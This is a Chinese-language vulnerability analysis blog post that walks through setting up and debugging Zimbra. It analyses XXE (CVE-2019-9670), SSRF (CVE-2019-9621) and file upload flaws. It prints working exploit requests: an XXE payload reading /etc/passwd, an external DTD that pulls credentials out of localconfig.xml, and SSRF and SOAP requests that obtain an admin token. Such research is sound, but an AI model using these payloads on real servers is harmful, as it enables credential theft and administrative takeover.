# Zimbra 漏洞分析之路

阅读量 **344271**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-21 15:30:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01e87557d4c427372a.jpg)

网上关于Zimbra的漏洞调试文章比较粗浅，在十一国庆期间学习了Zimbra的相关漏洞原理和搭建技术。本文从环境搭建，架构梳理，漏洞调试等方面展开分析，带领的大家能够快速熟悉开源软件Zimbra的漏洞挖掘之路。

#  0x01 Zimbra介绍

Zimbra是著名的开源系统，提供了一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。一体化地提供了邮件收发、文件共享、协同办公、即时聊天等一系列解决方案，是开源软件中的精品。作为邮件服务器系统，Zimbra更是凭借卓越的稳定性和功能当之无愧地成为开源邮件服务器系统的首选，适合各类型/人数的用户群，尤其适合团队使用。其最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。

![](https://p0.ssl.qhimg.com/t0199d877040c9cb52f.jpg)

![](https://p2.ssl.qhimg.com/t013f37b022206ea955.jpg)

## 0x02 环境搭建

###  0x1 软件及源码下载

部署环境下载地址：<https://www.zimbra.com/downloads/zimbra-collaboration-open-source/archives/>  
源码下载地址：<https://github.com/Zimbra/zm-mailbox/tags>

###  0x2 基于ubuntu的Zimbra环境搭建

**0\. 启动docker ubuntu容器**

    
    
    docker run -p 25:25 -p 80:80 -p 465:465 -p 587:587 -p 110:110 -p 143:143 -p 993:993 -p 995:995 -p 443:443 -p 8080:8080 -p 8443:8443 -p 7071:7071 -p 9071:9071 -h zimbra-docker.zimbra.io --dns 127.0.0.1 --dns 8.8.8.8 -i -t -e PASSWORD=Zimbra2017 ubuntu:14.04
    

**1\. 安装依赖包**

为zimbra提供运行环境，需要安装以下应用

    
    
    apt update
    apt install  libgmp3c2 libpcre3 libgmp3-dev sysstat libexpat1  wget netcat-openbsd pax sqlite3
    

**2\. 执行安装脚本**

安装脚本主要负责下载部署环境，设置环境变量以及部署zimbra以及开启服务。

    
    
    #!/bin/sh
    ## Preparing all the variables like IP, Hostname, etc, all of them from the container
    sleep 5
    HOSTNAME=$(hostname -a)
    DOMAIN=$(hostname -d)
    CONTAINERIP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
    RANDOMHAM=$(date +%s|sha256sum|base64|head -c 10)
    RANDOMSPAM=$(date +%s|sha256sum|base64|head -c 10)
    RANDOMVIRUS=$(date +%s|sha256sum|base64|head -c 10)
    
    ## Installing the DNS Server ##
    echo "Configuring DNS Server"
    mv /etc/dnsmasq.conf /etc/dnsmasq.conf.old
    cat <<EOF >>/etc/dnsmasq.conf
    server=8.8.8.8
    listen-address=127.0.0.1
    domain=$DOMAIN
    mx-host=$DOMAIN,$HOSTNAME.$DOMAIN,0
    address=/$HOSTNAME.$DOMAIN/$CONTAINERIP
    user=root
    EOF
    sudo service dnsmasq restart
    
    ##Creating the Zimbra Collaboration Config File ##
    touch /opt/zimbra-install/installZimbraScript
    cat <<EOF >/opt/zimbra-install/installZimbraScript
    AVDOMAIN="$DOMAIN"
    AVUSER="admin@$DOMAIN"
    CREATEADMIN="admin@$DOMAIN"
    CREATEADMINPASS="$PASSWORD"
    CREATEDOMAIN="$DOMAIN"
    DOCREATEADMIN="yes"
    DOCREATEDOMAIN="yes"
    DOTRAINSA="yes"
    EXPANDMENU="no"
    HOSTNAME="$HOSTNAME.$DOMAIN"
    HTTPPORT="8080"
    HTTPPROXY="TRUE"
    HTTPPROXYPORT="80"
    HTTPSPORT="8443"
    HTTPSPROXYPORT="443"
    IMAPPORT="7143"
    IMAPPROXYPORT="143"
    IMAPSSLPORT="7993"
    IMAPSSLPROXYPORT="993"
    INSTALL_WEBAPPS="service zimlet zimbra zimbraAdmin"
    JAVAHOME="/opt/zimbra/common/lib/jvm/java"
    LDAPAMAVISPASS="$PASSWORD"
    LDAPPOSTPASS="$PASSWORD"
    LDAPROOTPASS="$PASSWORD"
    LDAPADMINPASS="$PASSWORD"
    LDAPREPPASS="$PASSWORD"
    LDAPBESSEARCHSET="set"
    LDAPDEFAULTSLOADED="1"
    LDAPHOST="$HOSTNAME.$DOMAIN"
    LDAPPORT="389"
    LDAPREPLICATIONTYPE="master"
    LDAPSERVERID="2"
    MAILBOXDMEMORY="512"
    MAILPROXY="TRUE"
    MODE="https"
    MYSQLMEMORYPERCENT="30"
    POPPORT="7110"
    POPPROXYPORT="110"
    POPSSLPORT="7995"
    POPSSLPROXYPORT="995"
    PROXYMODE="https"
    REMOVE="no"
    RUNARCHIVING="no"
    RUNAV="yes"
    RUNCBPOLICYD="no"
    RUNDKIM="yes"
    RUNSA="yes"
    RUNVMHA="no"
    SERVICEWEBAPP="yes" SMTPDEST="admin@$DOMAIN"
    SMTPHOST="$HOSTNAME.$DOMAIN"
    SMTPNOTIFY="yes"
    SMTPSOURCE="admin@$DOMAIN"
    SNMPNOTIFY="yes"
    SNMPTRAPHOST="$HOSTNAME.$DOMAIN"
    SPELLURL="http://$HOSTNAME.$DOMAIN:7780/aspell.php"
    STARTSERVERS="yes"
    SYSTEMMEMORY="3.8"
    TRAINSAHAM="ham.$RANDOMHAM@$DOMAIN"
    TRAINSASPAM="spam.$RANDOMSPAM@$DOMAIN"
    UIWEBAPPS="yes"
    UPGRADE="yes"
    USEKBSHORTCUTS="TRUE"
    USESPELL="yes"
    VERSIONUPDATECHECKS="TRUE"
    VIRUSQUARANTINE="virus-quarantine.$RANDOMVIRUS@$DOMAIN"
    ZIMBRA_REQ_SECURITY="yes"
    ldap_bes_searcher_password="$PASSWORD"
    ldap_dit_base_dn_config="cn=zimbra"
    ldap_nginx_password="$PASSWORD"
    ldap_url="ldap://$HOSTNAME.$DOMAIN:389"
    mailboxd_directory="/opt/zimbra/mailboxd"
    mailboxd_keystore="/opt/zimbra/mailboxd/etc/keystore"
    mailboxd_keystore_password="$PASSWORD"
    mailboxd_server="jetty"
    mailboxd_truststore="/opt/zimbra/common/lib/jvm/java/lib/security/cacerts"
    mailboxd_truststore_password="changeit"
    postfix_mail_owner="postfix"
    postfix_setgid_group="postdrop"
    ssl_default_digest="sha256"
    zimbraDNSMasterIP=""
    zimbraDNSTCPUpstream="no"
    zimbraDNSUseTCP="yes"
    zimbraDNSUseUDP="yes"
    zimbraDefaultDomainName="$DOMAIN"
    zimbraFeatureBriefcasesEnabled="Enabled"
    zimbraFeatureTasksEnabled="Enabled"
    zimbraIPMode="ipv4"
    zimbraMailProxy="FALSE"
    zimbraMtaMyNetworks="127.0.0.0/8 $CONTAINERIP/32 [::1]/128 [fe80::]/64"
    zimbraPrefTimeZoneId="America/Los_Angeles"
    zimbraReverseProxyLookupTarget="TRUE"
    zimbraVersionCheckInterval="1d"
    zimbraVersionCheckNotificationEmail="admin@$DOMAIN"
    zimbraVersionCheckNotificationEmailFrom="admin@$DOMAIN"
    zimbraVersionCheckSendNotifications="TRUE"
    zimbraWebProxy="FALSE"
    zimbra_ldap_userdn="uid=zimbra,cn=admins,cn=zimbra"
    zimbra_require_interprocess_security="1"
    zimbra_server_hostname="$HOSTNAME.$DOMAIN"
    INSTALL_PACKAGES="zimbra-core zimbra-ldap zimbra-logger zimbra-mta zimbra-snmp zimbra-store zimbra-apache zimbra-spell zimbra-memcached zimbra-proxy"
    EOF
    
    if [ ! -f /opt/zimbra-install/zimbra-zcs-8.6.0.tar.gz ];
    then
      ##Install the Zimbra Collaboration ##
      echo "Downloading Zimbra Collaboration 8.6.0"
      wget -O /opt/zimbra-install/zimbra-zcs-8.6.0.tar.gz https://files.zimbra.com/downloads/8.6.0_GA/zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz
    
      echo "Extracting files from the archive"
      tar xzvf /opt/zimbra-install/zimbra-zcs-8.6.0.tar.gz -C /opt/zimbra-install/
    
      echo "Update package cache"
      apt update
    
      echo "Installing Zimbra Collaboration just the Software"
      cd /opt/zimbra-install/zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116 && ./install.sh -s < /opt/zimbra-install/installZimbra-keystrokes
    
      echo "Installing Zimbra Collaboration injecting the configuration"
      /opt/zimbra/libexec/zmsetup.pl -c /opt/zimbra-install/installZimbraScript
    fi
    
    su - zimbra -c 'zmcontrol restart'
    echo "You can access now to your Zimbra Collaboration Server"
    

这里贴上几个常用的安装教程

  * <https://qing.su/article/zimbra.html>
  * <https://www.howtoing.com/ubuntu-14-04-zimbra-server/>

最后要注意在install.sh脚本执行的最后要设置admin的密码，`*******`处为必须填写的内容

![](https://p4.ssl.qhimg.com/t0180c9b96a37a76f64.jpg)

###  0x3 基于Java的远程调试技术

**1\. 找到之前的启动进程**

通过`ps -ef | grep java`找到相对应的java进程

![](https://p5.ssl.qhimg.com/t01a3f0e77362daacef.jpg)

**2\. 杀掉启动进程**

利用kill指令将之前的进程杀掉

![](https://p5.ssl.qhimg.com/t01941963d56540a939.jpg)

这里有个小技巧，首先kill 掉java web的守护进程，如果不这么做的话，java
web会很快启动，所以我们需要先kill掉守护进程，之后kill掉java web。

**3\. 开启调试**

再之后我们像以前一样给java web启动程序添加调试参数`-Xdebug
-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005`

![](https://p4.ssl.qhimg.com/t016858b97cb2da6401.jpg)

因为是在docker中搭建的环境，需要做层端口映射，将监听端口开启在宿主机上。打开idea 的remote配置设置IP地址和端口

![](https://p5.ssl.qhimg.com/t0182b56b71f9fa21b7.jpg)

![](https://p4.ssl.qhimg.com/t01a85cf7d2aa2da647.jpg)

出现Connected to target VM 字样即表示已经连接服务并开启Debug模式。

**4\. 添加lib依赖库**

    
    
    /opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/service/WEB-INF/lib/
    /opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbraAdmin/WEB-INF/lib/
    /opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbra/WEB-INF/lib/
    /opt/zimbra/jetty-distribution-9.1.5.v20140505/common/lib/
    /opt/zimbra/jetty-distribution-9.1.5.v20140505/lib/
    /opt/zimbra/lib/jars/
    

将这些文件文件夹中的jar包下载到调试机器上，依次添加到lib依赖中

![](https://p3.ssl.qhimg.com/t01d9cd4c56dbfc3168.jpg)

## 0x03 框架梳理

在进入docker容器时，注意采用以下命令，通过配置privileged权限，才能通过lsof以及netstat指令查看端口所对应的进程名称。

    
    
    docker exec --privileged -it bef76c5ba54a  bash
    

###  0x1 服务架构

Zimbra web服务主要有Nginx做流量转发，Java负责核心Web业务，通过配置Nginx的配置文件，达到对各个路由的服务划分。

###  0x2 nginx 服务配置

zimbra的web服务由nginx进行流量转发，我们可以看下nginx 服务的配置文件

![](https://p2.ssl.qhimg.com/t0188b7d3d55e4cdc2a.jpg)

    
    
    # NGINX POP/IMAP proxy configuration file for use with Zimbra
    #
    
    working_directory /opt/zimbra;
    include /opt/zimbra/conf/nginx/includes/nginx.conf.main;
    include /opt/zimbra/conf/nginx/includes/nginx.conf.memcache;
    include /opt/zimbra/conf/nginx/includes/nginx.conf.zmlookup;
    include /opt/zimbra/conf/nginx/includes/nginx.conf.mail;
    include /opt/zimbra/conf/nginx/includes/nginx.conf.web;
    
    # Don't edit the below comment
    
    #__SUCCESS__
    

这里我们只关注 /opt/zimbra/conf/nginx/includes/nginx.conf.web

![](https://p5.ssl.qhimg.com/t01d39d341100f36f80.jpg)

可以看出上图配置的是后台服务端口与别名，在nginx.conf.web的最后include两个文件

    
    
      include /opt/zimbra/conf/nginx/includes/nginx.conf.web.https;
        include /opt/zimbra/conf/nginx/includes/nginx.conf.web.https.default;
    

关于流量的转发，这里从nginx.conf.web.https.default配置文件中选出一个转发片段，分析如下

    
    
       location ~* /(service|principals|dav|\.well-known|home|octopus|shf|user|certauth|spnegoauth|(zimbra/home)|(zimbra/user))/
        {
            set $mailhostport 8080;   # replace this with *the* mailhost port
            set $relhost $host;
    
            if ($mailhostport != 80) {   # standard HTTP port, do not replace
                set $relhost $host:$mailhostport;
            }
    
            # End stray redirect hack
    
            # Proxy to Zimbra Mailbox Upstream
            proxy_pass       https://zimbra_ssl;
    
            # For audit
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    
            # For Virtual Hosting
            set $virtual_host $http_host;
            if ($virtual_host = '') {
                set $virtual_host $server_addr:$server_port;
            }
            proxy_set_header Host            $virtual_host;
    
    
            proxy_redirect http://$http_host/ https://$http_host/;
    
            proxy_redirect http://$relhost/ https://$http_host/;
        }
    

location 后面的正则表示，一旦匹配成功那么此次请求的服务配置走当前location中的配置。proxy_pass
将流量转发到后面的别名服务上，上面的别名服务为zimbra_ssl，找到
/opt/zimbra/conf/nginx/includes/nginx.conf.web 中对应的ip和port

    
    
        upstream zimbra_ssl
        {
            server    zimbra-docker.zimbra.io:8443 fail_timeout=60s version=8.6.0_GA_1153;
    
            zmauth;
        }
    

###  0x3 Java web 服务

由端口进程对应关系来看，zimbra的java启动程序开启了多个java端口，如下图所示：

![](https://p0.ssl.qhimg.com/t01943a411da6c32f30.jpg)

这些端口对应着不同的servlet并且在服务重启后会将重新缓存每个端口路由与servlet的映射关系。

![](https://p4.ssl.qhimg.com/t01f5b70970f61cbc07.jpg)

servlet 缓存代码，为了加速web请求响应，将所有的额servlet放到cache中进行缓存。所以如果是第一次请求该路由，都会进入下面代码分支

![](https://p4.ssl.qhimg.com/t01f3a84d5fd717e142.jpg)

最后所有的servlet分发都在ServletHolder.class中进行，通过servlet.service函数分发到对应的servlet

![](https://p5.ssl.qhimg.com/t0169d47271278ac0b9.jpg)

因为由不同的servlet进行处理，所以会出现一些断点断不下来的情况，这时要分清楚到底是走的那个servlet，我们只需要将断点设置在ServletHolder.class
的servlet.service(request, response)

## 0x04 漏洞调试

###  0x1 最新漏洞

CVE-2019-9670，CVE-2020-12846和CVE-2019-9621是近几年来爆出的最新漏洞，通过学习这两个漏洞的挖掘方法和漏洞成因，帮助我们更好的理解zimbra邮件系统的漏洞利用。

###  0x2 CVE-2019-9670 漏洞分析

**1\. 适用范围**

> 漏洞适用条件：8.7.4之前的版本，可以导致XML实体解析

**2\. 路由分析**

在Autodiscover路由中，可以在/opt/zimbra/mailboxd/etc/jetty.xml中找到对应的路由注册，下图为其中的一条配置

![](https://p0.ssl.qhimg.com/t01e7df3de045f4a78f.jpg)

由图中的配置可以看出符合该路由的url都会转发到`/service/autodiscover`路由上

![](https://p3.ssl.qhimg.com/t01169bb51fc11e8c43.jpg)

**3\. 漏洞调试**

利用burpsuit发送如下数据包

    
    
    POST /Autodiscover/Autodiscover.xml HTTP/1.1
    Host: 192.168.0.127
    Connection: keep-alive
    Content-Length: 347
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
    X-Zimbra-Csrf-Token: 0_c76c85d9f2471cf79b6cda4eab2363d8aa41e0a3
    Accept: */*
    Origin: https://192.168.0.127
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.0.127/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ZM_TEST=true;ZA_SKIN=serenity;
    
    <!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
        <Request>
          <EMailAddress>aaaaa</EMailAddress>
          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    

在关键代码上设置断点，分析如下：

![](https://p4.ssl.qhimg.com/t0142b0658010647c6b.jpg)

通过`doc.getElementsByTagName("Request")` 获取到xml结构中Request以下的所有节点

![](https://p4.ssl.qhimg.com/t01d55296e5cc68a8cb.jpg)

接下来利用for循环便利解析到的节点，利用getTagValue获取相对应标签中的值，代码如下图所示。

![](https://p3.ssl.qhimg.com/t016f6c76506147a374.jpg)

之后通过sendError函数将responseSchema字符串值带到response回显中

![](https://p1.ssl.qhimg.com/t01f98ba6b475778ec5.jpg)

最后的效果如下：

![](https://p4.ssl.qhimg.com/t01acd2e8b70f1ab838.jpg)

**4\. payload构造**

接下来构造payload读zimbra的配文件localconfig.xml，由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd：

这里将下面的xml放置到1.1.1.1服务器上，

    
    
    <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % end "]]>">
    <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
    

/opt/zimbra/conf/localconfig.xml
中存储了zimbra的关键配置信息，读取配置文件中的zimbra_user和zimbra_ldap_password

    
    
    <!DOCTYPE Autodiscover [
            <!ENTITY % dtd SYSTEM "http://1.1.1.1/zimbra.dtd">
            %dtd;
            %all;
            ]>
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
        <Request>
            <EMailAddress>aaaaa</EMailAddress>
            <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    

![](https://p1.ssl.qhimg.com/t01f263924876726d16.jpg)

###  0x3 CVE-2019-9670 漏洞后续利用分析

利用xxe获取/opt/zimbra/conf/localconfig.xml 中的用户名和密码， 通过soap接口获取低权限token。

**1\. Zimbra soap协议**

Zimbra soap协议的描述文档  
Admin SOAP API –
<https://zimbra.example.com/service/wsdl/ZimbraAdminService.wsdl>  
User SOAP API –
<https://zimbra.example.com/service/wsdl/ZimbraUserService.wsdl>  
Full SOAP API – <https://zimbra.example.com/service/wsdl/ZimbraService.wsdl>

![](https://p3.ssl.qhimg.com/t0100cc691b3bee2118.jpg)

对应的jar包为zimbrastore.jar

![](https://p0.ssl.qhimg.com/t01c96beff2fe281e09.jpg)

在jar包中com.zimbra.cs.service.account中有着许许多多的handler调用

![](https://p4.ssl.qhimg.com/t01b594d235ec527b81.jpg)

wsdl 中的element元素方法去掉Requests后缀就是zimbrastore.jar中的处理类。

**2\. 调试soap协议**

为了调试soap协议我们在HttpServlet.class中下断点

![](https://p2.ssl.qhimg.com/t01e3b7591bfe87c1ca.jpg)

最后由SoapServlet.class 进行处理，在其中通过请求分发的方式由SoapEngine解析分发出去

![](https://p1.ssl.qhimg.com/t0142bdf91198acf718.jpg)

最后由AccountDocumentHandler 子类Auth的handle方法调用

![](https://p2.ssl.qhimg.com/t01d08e45b10993df56.jpg)

**3\. 获取低权限token**

发送下面soap包即可获得低权限token

    
    
    POST /service/soap HTTP/1.1
    Host: 192.168.0.134
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.22.0
    Content-Length: 453
    
    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">zimbra</account>
            <password>ZN5CYxE10</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    

![](https://p3.ssl.qhimg.com/t01f55240fea9a5e990.jpg)

###  0x4 CVE-2019-9621 漏洞分析

**1\. 适用范围**

> 8.6 patch 13, 8.7.x before 8.7.11 patch 10, and 8.8.x before 8.8.10 patch 7
> or 8.8.x before 8.8.11 patch 3 通过 ProxyServlet 组件可以实现SSRF

**2\. 关键代码分析**

可以利用该漏洞通过SSRF访问admin接口获取高权限token，由ProxyServlet进行路由处理，关键代码如下：

zimbrastore.jar!/com/zimbra/cs/zimlet/ProxyServlet.class

在doProxy函数中首先获取了cookie中的ZM_ADMIN_AUTH_TOKEN值并赋值给authToken同时这里检验了authToken的权限（如果没有任何权限，则赋值为空），当authToken不为null时就会进入代理转发，如下图所示：

![](https://p3.ssl.qhimg.com/t015d14af24931f4677.jpg)

最后利用传递过去的target参数创建URL对象，获取/service/proxy的请求类型以及请求body，新建PostMethod对象并赋值给method参数，通过执行HttpClientUtil.executeMethod方法将method参数传递过去并执行。

![](https://p1.ssl.qhimg.com/t011e1e3d3b4ef8676c.jpg)

![](https://p5.ssl.qhimg.com/t014fd11253ea7b6e5b.jpg)

**3\. 获取高权限token分析**

此数据包中的Cookie由/service/soap提供，发送同/service/soap内容，但是AuthRequest的xmlns要改为：urn:zimbraAdmin，否则获取的还是普通权限的Token

    
    
    POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.22.0
    Cookie: ZM_ADMIN_AUTH_TOKEN=0_57d26651159b7e02e5c507e2f5e15e8512601728_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313630323235353237303330393b747970653d363a7a696d6272613b7469643d393a3336393535383031383b;
    Host: foo:7071
    Content-Type: application/xml
    Content-Length: 451
    
    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAdmin">
            <account by="adminName">zimbra</account>
            <password>ZN5CYxE10</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    

通过ssrf
访问`https://127.0.0.1:7071/service/admin/soap`之后，来到了之前分析的soap协议处理代码部分。通过SoapEngine转发到相关处理代码

![](https://p0.ssl.qhimg.com/t01212bbc6222bb4801.jpg)

还记得之前的位于account目录下的auth.class吗，这次的auth类位于admin认证下，由这个类的handle负责处理。

![](https://p0.ssl.qhimg.com/t018726e9529b1c53d1.jpg)

获取过soap协议的password之后，带入到ldap进行authAccount认证，之后将认证通过的cookie通过getAuthToken函数进行获取，如下图代码所示：

![](https://p4.ssl.qhimg.com/t016481adcafd07cae1.jpg)

最后获取高权限admin 的Token

![](https://p3.ssl.qhimg.com/t01c8f4dff52d966ea6.jpg)

###  0x5 低版本文件上传漏洞

**1\. 适用范围**

> ZimbraCollaboration Server 8.8.11 之前的版本

**2\. servlet 分析**

/service/extension/clientUploader/upload 对应 ExtensionDispatcherServlet  
在获取请求方法之后，根据不同方法的处理逻辑用if判断分别路由，文件上传请求最后触发handler.doPost(req, resp)函数

![](https://p1.ssl.qhimg.com/t019304540361baaf85.jpg)

对应的jar包在/opt/zimbra/lib/ext/com_zimbra_clientuploader/com_zimbra_clientuploader.jar，因此分析时需要单独将jar包添加在idea的依赖当中

**3\. 处理逻辑分析**

进入到ClientUploadHandler.class进行处理，doPost方法接收到请求后，处理上传的文件内容

![](https://p5.ssl.qhimg.com/t01a082f3a56cc7e6cd.jpg)

之后调用man.uploadClient函数进行post data处理，提取文件名并保存至文件。

![](https://p3.ssl.qhimg.com/t019a0d5962665ef6a7.jpg)

进行目录拼接，最后文件存储在/opt/zimbra/jetty/webapps/zimbra/downloads

![](https://p4.ssl.qhimg.com/t01eebb8beb88d79647.jpg)

![](https://p0.ssl.qhimg.com/t01ff5bccc1b93177d3.jpg)

在download目录可以看到文件上传成功

![](https://p1.ssl.qhimg.com/t01f4e3d19c8f3f2b1c.jpg)

###  0x5 CVE-2020-12846 漏洞分析

**1\. 适用范围**

> Zimbra before 8.8.15 Patch 10 and 9.x before 9.0.0 Patch 3

漏洞描述：在/service/upload servlet
潜在的威胁，用户上传的可执行文件（exe,sh,bat,jar）将会保存在/opt/zimbra/data/tmp/upload/ 有可能导致任意命令执行。

**2\. 路由分析**

构造如下数据包，发送到服务

    
    
    POST /service/upload?lbfums= HTTP/1.1
    Host: 192.168.0.134
    Connection: close
    Content-Length: 15
    Cache-Control: no-cache
    X-Zimbra-Csrf-Token: 0_38c319c70c81c56eed17aad5e35812fa21001948
    X-Requested-With: XMLHttpRequest
    Content-Disposition: attachment; filename="/tmp/sss.sh"
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
    Content-Type: image/png;
    Accept: */*
    Origin: https://192.168.0.134
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.0.134/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ZM_TEST=true; ZM_AUTH_TOKEN=0_8b9e5ad6b5a6bd4187ddf6d643878ef8b46f8095_69643d33363a65373732363130352d646234652d346264322d616265392d3761306163373763333366373b6578703d31333a313630323137303035333339303b747970653d363a7a696d6272613b7469643d393a3738343036353232323b76657273696f6e3d31333a382e362e305f47415f313135333b637372663d313a313b; ZM_ADMIN_AUTH_TOKEN=0_627eb9423481a632a34a4f127477ff846abdafd6_69643d33363a65373732363130352d646234652d346264322d616265392d3761306163373763333366373b6578703d31333a313630323034323732313033303b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313737393534363132383b76657273696f6e3d31333a382e362e305f47415f313135333b; JSESSIONID=12djzn3t02efa9d03k80lut35
    
    
    touch /tmp/aaa
    

由HttpServlet接受并处理，最后由zimbrastore.jar!/com/zimbra/cs/service/FileUploadServlet.class处理

![](https://p5.ssl.qhimg.com/t013dce48fbf3b35dc9.jpg)

**3\. 漏洞分析**

在doPost入口处获取了admin token并进行判断，如果合法则继续，所以该文件上传漏洞必须在admin权限下。

![](https://p2.ssl.qhimg.com/t01131a573d9b732ea7.jpg)

接下来检验csrftoken的合法性，如果不合法也是直接结束

![](https://p2.ssl.qhimg.com/t010606cca2d261cab5.jpg)

获取请求参数lbfums赋值给limitByFileUploadMaxSize，判断Content-Type类型进入MultipartUpload和PlainUpload两个分支。

![](https://p3.ssl.qhimg.com/t014169943e06f7028d.jpg)

最后临时文件存储在 /opt/zimbra/data/tmp/upload/

![](https://p0.ssl.qhimg.com/t01335e6d229c8692cb.jpg)

![](https://p1.ssl.qhimg.com/t0179dca04930e8aab4.jpg)

最后关于该漏洞的利用大家可以一起讨论下

## 0x05 总结

本文从zimbra java web的部署，调试环境搭建，框架梳理，漏洞分析等多个方面介绍了关于zimbra
开源邮件系统的分析方法，总结了一些分析经验，关于zimbra的漏洞挖掘和分析仍有很多方面没有研究清楚，之后将会对zimbra子模块功能进行详细的分析，希望大家一起来参与讨论。

## 0x06 参考文献

<https://xz.aliyun.com/t/4490>  
<https://www.howtoing.com/ubuntu-14-04-zimbra-server/>  
<https://blog.csdn.net/weixin_40709439/article/details/90136596>  
<https://recomm.cnblogs.com/blogpost/10741381?page=1>  
<https://sec.thief.one/article_content?a_id=0ec1e192fe6336efdf2783c62c102afc>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/220239](/post/id/220239)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [邮件安全](/tag/邮件安全)
  * [Zimbra](/tag/Zimbra)

 **+1** __8赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

